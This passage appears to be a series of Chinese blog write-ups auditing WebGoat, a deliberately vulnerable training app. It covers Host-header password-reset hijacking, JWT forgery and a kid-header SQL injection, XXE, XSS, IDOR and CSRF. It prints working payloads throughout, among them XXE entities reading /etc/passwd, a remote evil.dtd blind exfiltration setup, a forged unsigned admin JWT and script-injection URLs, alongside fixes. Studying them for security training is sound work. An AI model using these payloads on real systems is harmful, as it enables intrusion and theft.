拦截器的作用，判断传进来的参数是否为邮箱的格式\n\n看了很久都感觉没有洞，后面查了才知道这题只是让我们感受一下 WebWolf，并不是直接挖洞哈哈哈哈哈\n题目部分\n发送一下忘记密码的邮件即可\n\n\n\n再登录即可，只是让我们感受一下 WebGoat 而已，晕……\n\n解出题目之后是不会变色的，不必在意\n\n2. Password Reset PageLesson4 爆破密保源码部分\n\n\n获取输入的第 56，57 行拉出来单独讲解一下 getOrDefault\n\n参数说明：\n\nkey - 键\ndefaultValue - 当指定的key并不存在映射关系中，则返回的该默认值\n\n\n返回值\n\n返回 key 相映射的的 value，如果给定的 key 在映射关系中找不到，则返回指定的默认值。\nString securityQuestion = (String) json.getOrDefault(\"securityQuestion\", \"\");  // 获取当前参数的 \"securityQuestion\" 值，若没有 \"securityQuestion\"，则返回 \"\"\nString username = (String) json.getOrDefault(\"username\", \"\");\n\n分析完毕，看到上面的 static 中有一些字符，直接尝试爆破\n题目部分抓包，并将颜色部分添加 dollar 符，进行爆破\n\n\n再发包，成功。\n\n\n\n这也给我们的渗透攻击提供了一些思路，在实际的渗透测试当中，对于回答密保问题来验证身份，也可使用爆破。\n正确的防御手法应该是添加验证码。\n\n3. Password Reset PageLesson5 关于密保的小 tips这里让我们写密保时，不要写真实的答案，不然会被社工。选 favorite color\n4. Password Reset PageLesson6 修改重置密码的链接 Creating the password reset link\n题意是让我们创建一个密码重置的链接，这种情景需要先行理解一下。\n\n我们邮箱中收到重置密码的邮件时，通常都会发给我们另外一个 Web 地址，上面是去往密码重置的 Web 界面。\n\n在此时，若我们修改了这个密码重置的 Web 链接。举个例子，Tom 的邮箱对应的地址是 10.48.244.196:8011，那么 8011 这个端口就是专门为了 Tom 设置的。\n假设我的账户名叫 Jerry，邮箱的地址是 10.48.244.196:8022，那么我先请求一个 “forget password” ，名字是 Tom 的邮箱，再将去到的 Host 修改为我自己的 “10.48.244.196:8022”；若后台不加以任何的限制，我们就可以越权修改 Tom 的密码。\n\n本道靶场就演示了这么一个情况。当我们输入要找回密码的邮箱时，会将链接发送道我们邮箱，点开链接才是修改密码的。\n\n\n\n攻击思路已经比较清楚了，我们再看一看源码\n\n源码部分\n主要是看发送密码重置链接的源码\n\n\n\n\n总体上比较好理解，为了帮助其他小伙伴理解，还是细讲一下吧\n\n第 67 - 69 行，几个变量的定义及赋值\nString resetLink = UUID.randomUUID().toString();  // resetLink 变量的值是由 UUID 产生的，至于 UUID 是一串随机数序列\nResetLinkAssignment.resetLinks.add(resetLink);  // 在接口中添加 resetLinks 这一段\nString host = request.getHeader(\"host\");  // host 的值是 Request 包中的 host 值\n\n后面的判断语句，判断 host 当中是否存在 WebWlof 服务对应的端口与 Host；之后再产生一个 Response 包中的 Session。\n\n很显然，就是这一句判断语句不够精确，所以才会导致漏洞，对应的攻击手段如下。\n\n题目部分先到忘记密码的界面，输入 tom@webgoat-cloud.org，并抓包。接着修改 Host 为 localhost:9090，也就是 WebWolf 的地址，这样子的话，原本是 Tom 忘记密码的操作就到了我们的邮箱上。\n\n\n再到 WebWolf 下的一个 Incoming requests 下，查看请求。\n\n\n再访问 http://124.222.21.138:9000/WebGoat/PasswordReset/reset/change-password 即可，因为 Tom 的请求的 Host 就为此，输入密码重置即可。\n修复方式固定我们的host就可以了，其实归根结底就是太相信用户的输入了，这也是很多安全问题存在的原因。\n0x03 Secure Passwords这里的和很多的业务逻辑漏洞是重复的，就简单过一遍靶场吧。\n1.Secure Passwords PageLesson4 防爆破的密码这里输入一传强密码即可，随意输入都可以 ~我这里的答案是 1!22@Misliq!39\n","categories":["代码审计"],"tags":["代码审计"]},{"title":"WebGoat代码审计-04-身份认证缺陷(上)","url":"/2022/04/07/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-04-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BC%BA%E9%99%B7(%E4%B8%8A)/","content":"WebGoat代码审计-04-身份认证缺陷(上)\n\nWebGoat代码审计-04-身份认证缺陷(上)0x01 写在前面\n换了一种思维，先看代码，从代码里面找漏洞，然后去做题，代码审计也应该是这样一个思路。\n\n0x02 Authentication Bypasses1. Authentication Bypasses PageLesson2 2FA 验证方式\n讲的是 2FA 的密码重置方式\n\n源码部分打开源代码，优先去找 return success 的代码模块\n\n\n说实话这一块看不懂，关键点应该是这一块代码，很明显是继承\nif (verificationHelper.verifyAccount(Integer.valueOf(userId), (HashMap) submittedAnswers))\n\n而在第 60 行这里\nAccountVerificationHelper verificationHelper = new AccountVerificationHelper();\n\n进入 AccoutVerificationHelper 看看，并移步到 AccoutVerificationHelper.verifyAccout 下。\n\n\nreturn true 的条件：\n\n①：UserId 相同\n②：第一个密保问题，即 secQuestion0 和上文中的 “作弊” 答案不一致\n③：第二个密保问题，即 secQuestion1 和上文中的 “作弊” 答案不一致\n\n\n\n上框为 “作弊” 答案，下框的意思是，密码问题的参数是 “secQuestion0” 与 “secQuestion1”。只需包含这个参数即可进行判断。\n靶场部分于是想到绕过手段，构造 payload 成功绕过 ~\n\n\n0x03 JWT Tokens1. JWT Tokens PageLesson3 简单理解 JWT\n打开源码，去找 JWT 那一块，代码很简单，简单判断了 “$user” 是否等于 user\n\n\n\n对 JWT 进行 base64 编码解密，轻松过\n\n\n\n\n2. JWT Tokens PageLesson5 替换 payload 绕过\n题意，通过 JWT Token 的问题，获得 admin 权限，从而修改这些 Vote 的内容&#x2F;样子。\n如果只是普通的 Guest 或者其他人的用户，是无法删除或者对投票界面进行更改操作的。\n\n源码部分\n打开文件 “JWTVotesEndPoint.java”，首先第一个函数，构造 Vote 界面\n\n\n\n这里对应的就是四个投票界面，在前端界面如图所示\n\n\n这里有一段语句要单独拿出来讲一下，因为和 JWT 的代码原理密不可分。\n\n\nString token = Jwts.builder()   // 创建 JWT 对象\n        .setClaims(claims)      //  设置主题(声明信息)\n        .signWith(io.jsonwebtoken.SignatureAlgorithm.HS512, JWT_PASSWORD) // 设置安全密钥(生成签名所需的密钥和算法)\n        .compact(); // 生成token（1.编码 Header 和 Payload 2.生成签名 3.拼接字符串）\n\n\n寻找一下何处可以绕过 admin 验证的，第 163 - 184 行\n\n\n\n逐行分析，代码审计前面的 166 - 168 行这里，判断 “accessToken” 是否为空，若为空，则返回 failed；若不为空，则进入 else 语句\n第 169 - 178 行，核心的判断语句。\n\n170 行的语句，验证 token\nJwt jwt = Jwt.paraser()     // 创建解析对象\n.setSigningKey(JWT_PASSWORD)// 设置安全密钥（生成签名所需的密钥和算法）\n.parse(accessToken)  // 解析token\nClaims claims = (Claims) jwt.getBody(); // 获取 payload 部分内容\n第 172 行解读一下，中间是空格就可以了； claims.get(&quot;admin&quot;) 这句语句得到的是 JWT 的 Payload 信息，数据类型是 String，通过 Boolean.valueOf(String)，将其转变为 Boolean 的数据类型；判断依据则是 Payload 的值是否等于 admin；若等于 admin，则为 True，反之为 False\nboolean isAdmin = Boolean.valueOf((String) claims.get(\"admin\"));\n\n代码解读到这里，师傅们应该也能看懂原理了吧，我们加快分析进度~\n\n第 173 - 178 行，判断 isAdmin 是否为 admin，若为 admin 时，将 vote 的值还原，并且返回 success 的消息。\nvotes.values().forEach(vote -> vote.reset());  // 四个 vote 的值还原到最开始\nreturn success(this).build();\n靶场部分\n根据上面的代码审计分析，其实我们只需要抓一个 JWT 的包，并且将 JWT 当中的 Payload 修改为 “Admin”，再发包即可。\n\n点击删除时抓包，如图所示\n\n\n将这一串 token 拿出来，base64 解码一下。\n\n\n那这里，我们发包的时候将 &quot;admin&quot;:&quot;false&quot; 修改为 &quot;admin&quot;:&quot;true&quot; 即可，再发包。\n这里推荐一个 JWT 在线生成的工具，不要想着用 base64 去弄，我这里踩坑花了大概半个小时才解决，不信邪的小伙伴们可以试一试。工具网站：JSON Web Tokens - jwt.io\nJWT token 是\neyJhbGciOiJIUzUxMiJ9.eyJpYXQiOiIxNjQ5NzUwMzg1IiwiYWRtaW4iOiJ0cnVlIiwidXNlciI6IlRvbSJ9.\n\n\n3. JWT Tokens PageLesson7 parseClaimsJws 与 parse这里虽然是两道选择题，但是还是有必要提一嘴\n放进 Burpsuite 当中比较一下两段代码\n\n\n\n对于 parseClaimsJws 来说，alg 为 none 则直接抛出异常\n对于 parse 来说，alg 为 none 则是判断是否为某个身份的依据。这里的 alg 如果被设置成 none，可以很好的绕过\n\n综上，parseCliamsJws 的防御能力能强答案是 1，3\n4. JWT Tokens PageLesson8 Secret Key\n题意：让我们通过爆破的手段找出 JWT 当中的 Secret Key\n\n一旦拥有了一个JWT token，我们可以尝试离线暴力破解或字典攻击。\n源码部分\n代码审计查看源码，第 85 行，返回成功的条件\nif (WEBGOAT_USER.equalsIgnoreCase(user))\n\n再返回去看上面的判断条件\n最后爆得 “Secret Key” 的值为 shipping(做题时每个人是不一样的)，也可以使用 hashcat \n5. JWT Tokens PageLesson10 Refresh a token题目是 Refreshing a token，那总归是要先探究为什么要 Refreshing a token。\ntoken类型分为两种：access token 和 refreshing token\n为什么需要refreshing token？\n\n为了避免多次验证access token(超时或是浪费资源)\n\nrefreshing token 由server生成并存储在server的数据库里，验证时对比即可。\n\n\n个人感觉就是 session cookie 和 set-cookie 差不多\n\n题目要求我们，让 Tom 付钱\n\n源码部分源码部分如图所示，直接看如何才能成功的部分\n\n\n第 106 行，这里比对了 Tom 是否为 user。但是一番抓包之后一无所获，甚至连 Tom 是谁，token 是啥全然不知。\n回到题目界面，查看一下 logs.txt，发现了 Tom 的 token，丢到 jwt.io 中去验证一下。\n\n\n应该是没这么简单的，回到源代码中看一看其他的接口\n\n\n这里是关键点了，之前尝试了使用 logs.txt 中的 JWT 登录，最终失败了，个人的一点猜测是这样的：之前 Tom 购买时是很早之前的记录了，所以对于我们来说，这时候的 JWT 其实已经是失效了的，但如果我们需要让 Tom 来付款，必须要临时给 Tom 创建一个新的 JWT，或者把 Tom 的 access_token 找出来。\n\n\n逐行代码审计又来了\n\n第 137 - 146 行，当 user 与 refreshToken 都存在，不为空的时候，JWT 成功被 Refresh。\n\nif (user == null || refreshToken == null) &#123;  \n    return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();  \n&#125; else if (validRefreshTokens.contains(refreshToken)) &#123;  \n    validRefreshTokens.remove(refreshToken);  \n return ok(createNewTokens(user));  \n&#125; else &#123;  \n    return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();  \n&#125;\n\n\n第 128 - 131 行，新构造出一个 JWT\n\ntry &#123;  \n    Jwt&lt;Header, Claims> jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(token.replace(\"Bearer \", \"\"));  \n user = (String) jwt.getBody().get(\"user\");  \n refreshToken = (String) json.get(\"refresh_token\");\n\n这里值得一提得是，最后解析 token 的参数，如果参数中存在 “Bearer” 就被替换为空格，这里感觉是有个双写绕过(?)，不清楚，一会儿试了就知道了。\n再明确一下攻击的方式，通过构造 JWT 中的 Header 部分，也就是 Header &#x3D; Authorization，把这一块放进 HTTP Request 当中。代码如下\n\n\n解题(巨坑，醉了)首先是在 WebGoat 的界面下抓包，然后会抓到 &#x2F;WebGoat&#x2F;JWT&#x2F;refresh&#x2F;login 的这么一个包，接着添加 Authorization 的头，值为 Bearer null，目的是获取一个 access_token，再发包。\n\n发包完之后，注意！！！！！！！！这里巨坑！！！！！\n\n这个 access_token 里面的最后一个字段是签名，不要拿进来！不要拿进来！不要拿进来！不要拿进来！\n\n\n在 JWTio 中编辑完毕后，去到 &#x2F;checkout 接口，发送前两个字段。\n\n\n\n6. JWT Tokens PageLesson11 final\n题意： Jerry 想从 Twitter 上删除 Tom 的账号，算是越权吧。\n\n源码部分\n\n核心部分在 89- 103 行这里。\n\n\n\n这里我把源代码贴出来再分析分析\n\nJwt jwt = Jwts.parser().setSigningKeyResolver(new SigningKeyResolverAdapter() &#123;  \n\t@Override  \n\tpublic byte[] resolveSigningKeyBytes(JwsHeader header, Claims claims) &#123;  \n\t\tfinal String kid = (String) header.get(\"kid\");  \n \t\ttry (var connection = dataSource.getConnection()) &#123; \n\t\t\tResultSet rs = connection.createStatement().executeQuery(\"SELECT key FROM jwt_keys WHERE id = '\" + kid + \"'\");  \n \t\t\twhile (rs.next()) &#123;  \n\t\t\t\treturn TextCodec.BASE64.decode(rs.getString(1)); \n &#125;  \n        &#125; catch (SQLException e) &#123;  \n            errorMessage[0] = e.getMessage();  \n &#125;  \n        return null;  \n &#125;  \n&#125;).parseClaimsJws(token);\n\n前面的代码都是之前差不多，新生成一个 JWT，引人注目的是第 94 行这里的 SQL 语句，感觉是存在 SQL 注入的。再好好审一审代码\n这次的 secret 是直接从数据库进行读取，而这个 SQL 语句查询的就是 JWT 的 secret。而因为之前使用了 parseClaimsJws 这个方法，于是无法构造 &#123;&quot;alg&quot;:&quot;none&quot;&#125; 来绕过。因此确定思路通过 SQL 注入来绕过。\n题目部分先点击 Delete 抓包，抓包的接口是 &#x2F;JWT&#x2F;final&#x2F;delete?token&#x3D;\n\n\n我们看到 JWT header 当中多了一个 “kid”\n修改包，将 “username” 修改为 Tom，再对 kid 进行 SQL 注入。这里使用 Union 联合查询注入。\n\n构造 payload，这里的 bmV3X2tleQ&#x3D;&#x3D; 需要经过 base64 编码，因为 rs.next() 会执行一次 base64 的编码，所以我们要去 SELECT 的 secret key 需要先经过 base64 编码。\n\n\"kid\": \"something_else' UNION SELECT 'bmV3X2tleQ==' FROM INFORMATION_SCHEMA.SYSTEM_USERS; --\",\n\n\n\n修改 kid 进行 SQL 注入，并修改 iat 以及其他需要修改的数据，如上图所示。并修改下面的 secret key\n\n\n\n不要点 secret base64 encoded ！不要点 secret base64 encoded ！不要点 secret base64 encoded ！不要点 secret base64 encoded ！不要点 secret base64 encoded ！不要点 secret base64 encoded ！\n这里踩坑卡了好久 …………\n\n接着，发包即可。\n","categories":["代码审计"],"tags":["代码审计"]},{"title":"WebGoat代码审计-05-XXE注入","url":"/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/","content":"WebGoat代码审计-05-XXE注入\n\nWebGoat 代码审计-05-XXE注入0x01 前言本篇文章只针对 WebGoat 下的 XXE 进行学习，需要进一步深入学习可以移步至我博客学习\n之前刷 Port 的时候，XXE 算是自己比较薄弱的一块，现在刷 Webgoat 的话要更加专注一些。\n0x02 靶场1. 提一嘴的 PageLesson3可以去看一眼，理解一下 DTD。而且这一页给我们提供了一个 XXE 例子。\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?>\n&lt;!DOCTYPE author [\n  &lt;!ENTITY js SYSTEM \"file:///etc/passwd\">\n]>\n&lt;author>&amp;js;&lt;/author>\n\n\n\n2. XXE PageLesson4 利用 file 协议读出敏感数据\n靶场题意：让我们通过对 index 下的图片添加评论，从而触发 XXE，导致列出文件系统的根目录。\n\n题目部分靶场如图所示\n\n\n我们在评论区内输入 123，并用 Burpsuite 抓包。抓包之后发现，请求的地址是 &#x2F;WebGoat&#x2F;xxe&#x2F;simple，POST 请求的正文是一个标准格式的 XML。\n&lt;?xml version=\"1.0\"?>\n&lt;comment>  \n\t&lt;text>123&lt;/text>\n&lt;/comment>\n\n\n\n既然这边的 XML 可以通过用户的输入进行自定义，所以我们构造如下的 payload：\n&lt;?xml version='1.0'?>\n&lt;!DOCTYPE any[&lt;!ENTITY test SYSTEM \"file:///etc/passwd\">]>\n&lt;comment>\n&lt;text>&amp;test;&lt;/text>\n&lt;/comment>\n\n\n\n在JAVA中，file:&#x2F;&#x2F;协议不仅可以读取文件，还可以列目录。\n\n源码部分前文我们说了，发包的时候请求的地址是 &#x2F;WebGoat&#x2F;XXE&#x2F;SimpleXXE，我们去翻这个源文件。\n\n\n最让人想看到的 return success(this).build() 在第 73 - 75 行。\n\n静下心来代码审计一下\n\n首先是第 68 行 与 第 71 - 72 行：第 68 行将 POST 请求中的 Body(正文) 中的内容赋值给 commentStr 这个字符串对象；第 71 - 72 行，将commentStr交给comments实例的parseXml方法来处理。并赋给Comment类的comment实例，说明经过parseXml方法处理后的类型为comment，最后comments.addComment(comment, false);来添加评论。\nvar comment = comments.parseXml(commentStr);  \ncomments.addComment(comment, false);\n\n跳转到 Comments.parseXml 去，主要描述了 parseXml 如何处理 commentStr。\n\n\n第 93 - 94 行单独拉出来讲\nvar jc = JAXBContext.newInstance(Comment.class);  \nvar xif = XMLInputFactory.newInstance();\n主要关注 JAXB\n\nJAXBContext\n\n\n前置知识：JAXB 作为 JDK 的一部分，能便捷地将 Java 对象与 XML 进行相互转换。\nJAXBContext 是整个 JAXB API 的入口。主要用来构建 JAXB 实例newInstance()。\nMarshaller接口，将Java对象序列化为XML数据。 \nUnmarshaller接口，将XML数据反序列化为Java对象。\n\nJAXBContext.newInstance(Comment.class) 的作用是将 Comment 这个对象进行注册，创建一个 JAXB 实例；实例名字在本代码中为 jc。\nComment 对象如图所示\n\n\n\n\n接下来要讲的是产生 XXE 的代码块原因\nvar unmarshaller = jc.createUnmarshaller();  \nreturn (Comment) unmarshaller.unmarshal(xsr);\n\n此处创建一个 Unmarshaller 对象。返回的值是 XML 经过unmarshal 方法处理的值。由于 unmarshal 在执行过程中解析了 XML(这里类似于反序列化的意思)，导致 XXE 注入。\n当把 XML 格式的字符串传递给 Unmarshaller 接口转变成 Java 对象时，会解析一遍 XML，如果传入的值可控就会导致 XXE 注入攻击。\n修复手段前文说到产生 XXE 注入是因为解析 XML 时不加任何的限制，那么我们的修复手段讲将支持外部实体和支持dtd都给禁止便可。\n\n借用木爷的代码\n\npackage XXE;\n\nimport lombok.var;\n\nimport javax.xml.bind.JAXBContext;\nimport javax.xml.bind.JAXBException;\nimport javax.xml.stream.XMLInputFactory;\nimport javax.xml.stream.XMLStreamException;\nimport java.io.StringReader;\n\npublic class XXERepair &#123;\n\n    public void Repair() throws JAXBException, XMLStreamException &#123;\n        String xml = \"&lt;?xml version=\\\"1.0\\\"?>\\n\" +\n                \"&lt;!DOCTYPE doc [ \\n\" +\n                \"&lt;!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">\\n\" +\n                \"]>&lt;comment>&lt;text>&amp;xxe;&lt;/text>&lt;/comment>\";\n        var jc = JAXBContext.newInstance(Comment.class);\n        // 创建了我们的工厂 读取xml的一个工厂\n        var xif = XMLInputFactory.newInstance();\n        // 不支持外部实体\n       // 后面两行是多加的代码 \n\t\txif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);\n        // 不支持dtd\n        xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);\n        var xsr = xif.createXMLStreamReader(new StringReader(xml));\n        // 将我们的xml 变成我们的java对象\n        var unmarshaller = jc.createUnmarshaller();\n        unmarshaller.unmarshal(xsr);\n\n    &#125;\n\n\n    public static void main(String[] args) throws JAXBException, XMLStreamException &#123;\n\n        XXERepair test = new XXERepair();\n        test.Repair();\n    &#125;\n&#125;\n\nComment 类\npackage XXE;\n\n\nimport lombok.AllArgsConstructor;\nimport lombok.Getter;\nimport lombok.NoArgsConstructor;\nimport lombok.Setter;\n\nimport javax.xml.bind.annotation.XmlRootElement;\n\n@Getter\n@Setter\n@AllArgsConstructor\n@NoArgsConstructor\n@XmlRootElement\npublic class Comment &#123;\n    private String user;\n    private String dateTime;\n    private String text;\n&#125;\n\n\n3. XXE PageLesson7 改变Content-Type利用 file 协议读出敏感数据\n题意：发包的 Body 修改成了 json 的格式，看上去不存在 XXE 了\n\n题目部分靶场和上一题长得一模一样，甚至上一题渗透的痕迹还在。\n\n\n抓个包，查看一下；发现是 Content-Type 变为 json\n\n\n尝试修改 Content-Type 为 application&#x2F;xml 再发包，并使用上一题的 payload\n\n\n源码部分ContentTypeAssignment.java 文件下的 xxe&#x2F;content-type 接口。\n\n\n\n源码部分，并没有对 Content-Type 进行严格的过滤。\n修复部分修复的话，应该从根源上解决，即和上题一致。\n4. XXE PageLesson10 盲注\n题意：获取 WebGoat 下的 secret.txt 文件\n\n题目部分按照多重 DTD 的思路继续，这里的方式比较常规，但是还是会给人带来一些疙瘩。\n\n首先是上传一个恶意的 DTD 到第三方服务器，这个恶意 DTD 我们暂且将其命名为 evil.dtd\n\nevil.dtd\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;!ENTITY secret SYSTEM 'file://用 WebGoat 给的路径替换进来'>\n\n上传之后，抓包，并构造 payload\n&lt;?xml version=\"1.0\"?>\n&lt;!DOCTYPE convert [ \n&lt;!ENTITY % remote SYSTEM \"http://localhost:9090/files/admin1123这里是自己的username/evil.dtd\">\n%remote;\n]>\n&lt;comment>  &lt;text>123 &amp;secret;&lt;/text>&lt;/comment>\n\n在 Burpsuite 中发包，接着刷新再输入即可。\n\n\n源码部分\n源码层面和之前是一样的，只是没有回显的消息了，我这里把有回显与无回显的都贴出来对比一下。\n\n","categories":["代码审计"],"tags":["代码审计"]},{"title":"WebGoat代码审计-07-XSS","url":"/2022/05/05/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-07-XSS/","content":"WebGoat代码审计-07-XSS\n\nWebGoat代码审计-07 XSS0x01 前言最近刷 Port 上的 Web Cache 投毒好累，醉了，真的费精力。WebGoat 这里的题目偏向代码审计，一些简单的题目就不在这里呈现了，有需要可以传送到 仙女象师傅的文章。\n0x02 XSS 开搞1. XSS PageLesson7 反射型 XSS\n题意让我们查找出一个易受到攻击的 XSS 字段，要对这些框进行逐个测试。\n\n题目部分靶场界面如图所示\n\n\n简单使用反射型 XSS 的 Payload\n&lt;script&gt;alert(1)&lt;&#x2F;script&gt;\n\n\n最终发现在 Credit card number 界面存在反射型 XSS\n\n\n\n源码部分\n是比较容易理解的\n\n\n\n44 - 46 行，定义了关于过滤 XSS 语句的正则，这个正则后续会用到；52 - 55 行，定义参数；定义的这些参数在 61 行进行了计算，并且后续无拼接操作，所以上面四个框内是不存在 XSS 的。\n63 - 68 行，定义一个新的 StringBuffer 类，这里我们看到明显两个参数是可控的，但是 WebGoat 的写法让我们只能对 Field1 进行注入。\n\n审计完毕 ~\n\n2. XSS PageLesson10 DOM 型 XSS 利用测试的代码进行 XSS 攻击DOM 型 XSS 全部都是由前端进行触发的。有时测试代码会留在生产环境当中，如果测试环境的代码能够被我们搞到，那弄 DOM 型 XSS 可谓手到擒来。\n题目部分题意：在生产期间保留在应用程序中的测试代码的路由是什么\n这是一种真正意义上的通过代码审计进行攻击的方式，需要我们一层一层去翻，去找 JS\n由于 DOM XSS 全部都是由前端进行触发的，所以我们关注的代码都在前端，直接点开 f12 对 JS 进行全局搜索，搜索内容为 route，得到的结果不多，都审计一下。\n\n\n\n重点关注 GoatRouter.js\n\n这里我们找到了 testRoute 这一 function\n\n\n进一步探，param 参数被传入了 lessonController 的 testHandler 方法，我们进一步去找 testHandler 方法。遵循 MVC 三层，很好找的。\nOK 找到 testHandler，继续探，去找 lessonContentView.js 中的 showTestParam 方法。\n\n\n成功找到 lessonContentView.js 中的 showTestParam 方法。\n\n\nshowTestParam 方法这里未处理，直接可以构造 XSS，但是这种构造是需要条件的，不是傻乎乎直接在对应的框内输入 XSS 的 Payload 就可以的。存在 XSS 的地方其实是测试环境，而给我们看的都是生产环境。\n哦差点把正事儿给忘了，先把 WebGoat 题目的答案写出来 ———— start.mvc#test\n\n我们再回过头来讲这道题里面 XSS 的利用。\n\n我们尝试访问 /start.mvc#test 接口，可以访问到，但是界面没什么变化，我们直接构造 XSS 的基础 Payload，记得要 URL 编码一下。\n&lt;script>alert(1)&lt;/script>\n\n一整个 URL 应该是 \nhttp:&#x2F;&#x2F;ip&#x2F;WebGoat&#x2F;start.mvc#test&#x2F;%3Cscript%3Ealert%281%29%3C%2fscript%3E\n\n\n代码审计这一块不是后端要去审计的部分，而是属于前端的 JS 的问题了。”象征性” 地挂一下代码 ~\n\n\n\n2. XSS PageLesson11 DOM 型 XSS\nDOM 型 XSS 的应用，同样也是和上一题一样的思路，一个个去挖。\n\n在 GoatRoute.js 中找到这个方法，这里不太懂，我看 WP 是直接这样子解决的。\n&lt;script>webgoat.custom.phoneHome()&lt;/script>\n\n我这里属实没看懂是为什么，如果题意没告诉我可以直接利用这个方法，那我不就几乎找不到了吗？\n还是挂一下 Payload 吧\nhttp:&#x2F;&#x2F;ip&#x2F;WebGoat&#x2F;start.mvc#test&#x2F;%3Cscript%3Ewebgoat.customjs.phoneHome%28%29%3C%2Fscript%3E\n\n访问之后页面上没有显示什么，打开开发者工具，进入 Console，可以看到要找的随机数（下图中最后一个高亮部分），填入上图输入框并提交即可过关。\n","categories":["代码审计"],"tags":["代码审计"]},{"title":"WebGoat代码审计-06-有缺陷的访问控制","url":"/2022/04/24/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-06-%E6%9C%89%E7%BC%BA%E9%99%B7%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/","content":"WebGoat代码审计-06-有缺陷的访问控制\n\nWebGoat代码审计 06 有缺陷的访问控制0x01 前言这段前言是不得不写咯 ~\n这篇文章也比较简单，源代码的问题基本都是逻辑漏洞\n这一篇的名为 **”有缺陷的访问控制”**，英文被称作 **”Broken Access Control”**。这一块如果总得来说非常复杂，水平提权，垂直提权，业务逻辑漏洞，身份认证，氦，我感觉太杂了。所以这一块的总结，个人或许讲解的不会很好。\n而这一块在 WebGoat 当中也被分为两个部分，不安全的直接引用，缺少功能级别的访问控制。\n自己日后也要做一个类似于 WebGoat 的靶场，所以自己思考地比较多。\n0x02 Insecure Direct Object References1. 直接对象引用，Direct Object References 是什么\n直接对象引用是指应用程序使用客户端提供的输入进行访问。\n例子\n\n\n\n使用 GET 方法的直接对象引用示例可能如下所示\nhttps://some.company.tld/dor?id=12345\nhttps://some.company.tld/images?img=12345\nhttps://some.company.tld/dor/12345\n\n而不安全的直接引用，呃，就是越权查看而已，我不太懂为什么要吹的这么 cjb。\n2. IDOR PageLesson2 简单登录题目部分直接以 username = tom 以及 password = cat 登陆即可，只是为了后续的做题更加顺利而已，没什么用。但是这里我们可以去看一看源码，看一看是怎么实现登录的。毕竟为自己以后的开发做铺垫。\n源码部分文件：IDORLogin.java\n首先是数据库，并没有连接数据库，而是使用 HashMap\n\n\n下面的登录阶段进行了强判断，主要是 username 与 password 的判断\n\n\nif (\"tom\".equals(username) &amp;&amp; idorUserInfo.get(\"tom\").get(\"password\").equals(password))\n\n3. IDOR PageLesson3题目部分也没啥好说的，就比对了一下前端界面的 Profile 与 Burpsuite 发包之后的 Response 回应即可，发现多出来了 Userid 与 role。\n\n\n在框中提交即可\n\n\n源码部分文件：IDORDiffAttributes.java\n\n比较简单，也是进行了呆笨的判断。\n\n\n\n4. IDOR PageLesson4 越权查看这种越权查看其实是我个人工作的时候遇到最多的。\n题目界面\n\n题目让我们直接越权查看信息，呃就挺简单的。\n\n\n\n在框中输入 WebGoat/IDOR/profile/2342384 即可。\n这就是最常见的越权查看，基本上的程序，如果开发者没有安全意识的话，是最容易造成的漏洞，一般我自己挖洞也会去尝试。并且这最后的参数 23422384 可以进行爆破，能够爆破更多的消息。\n\n源码界面文件：IDORViewOwnProfileAltUrl.java\n判断还是比较简单与呆笨的\n\n\n\n5. IDOR PageLesson5 越权查看他人信息题目界面分两个部分\n越权查看他人信息\n越权编写他人信息\n\n\n\n\n题目让我们越权查看他人的消息\n\n那么就按照我上题来攻击，爆破 userid\n\n\n经过爆破，找到 userid 为 2342388\n\n\n如果是要提交 src 的话，就需要这种越权查看的一起提交上去，也是替换 userid 即可。\n0x03 Missing Function Level Access Control\n个人觉得这其实不太算访问控制吧，见到可见和非可见的消息。\n\n1. Missing Function Level Access Control PageLesson2题目界面\n\n\n要求找到两个藏起来的菜单项\n\nf12 一下，在 Admin 附近找到了两个 href，分别是 users 与 config；输入即可。提交的话首字母要大写，避坑 ~\n源码部分文件：MissingFunctionACHiddenMenus.java\n\n简单的强判断\n\n\n\n1. Missing Function Level Access Control PageLesson3题意：找到自己的 Hash 并提交\n题目界面\n\n我们发现个人信息的界面是在 &#x2F;Users 接口下，尝试访问 &#x2F;Users 接口。\n访问 &#x2F;Users 接口之后居然返回 500 了；有点懵逼，因为再怎么说服务器端那边也不可能出问题吧。后来才知道要修改 Content-Type 为 application/json 才可以。\n\n\n提交自己的 Hash 即可。\n源码界面文件：MissingFunctionACUsers.java 和 MissingFunctionACYourHash.java\n\n将所有用户列出，此时需要 Content-Type 为 application/json\n\n\n\n\n判断的语句\n\n\n\n不算很难吧，但是自己开发起来想想就累\n0x04 小结怎么说呢，总的来说还是给我一种逻辑方面的问题，自己早些时候敲代码也被学长说过，逻辑太差。基本上就是乱敲，而且不考虑安全问题。\n","categories":["代码审计"],"tags":["代码审计"]},{"title":"WebGoat代码审计-09-跨站点请求伪造","url":"/2022/05/08/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-09-%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/","content":"WebGoat代码审计-09-跨站点请求伪造\n\nWebGoat代码审计-09-跨站点请求伪造\nWebGoat 这一部分主要分为两块 ———— CSRF 与 SSRF\n\n0x01 前言\n摘自木头师傅\n\n常见的请求伪造有两种，第一种跨站请求伪造也就是我们的 CSRF，第二种服务端请求伪造也就是我们的 SSRF。\nCSRF 通俗的说就是构造 payload 然后诱导受害者点击，从而利用受害者的身份去做一些事情。\nSSRF 服务端请求伪造简单的来说就是，这个请求是服务端发起的，通常有的功能会存在从第三方的链接等获取资源，但是如果没有对资源来源进行一个限定那么就可以导致我们可以利用服务端来请求他本地或者他其中的内网信息。\n0x02 CSRF1. CSRF PageLesson3 CSRF Poc 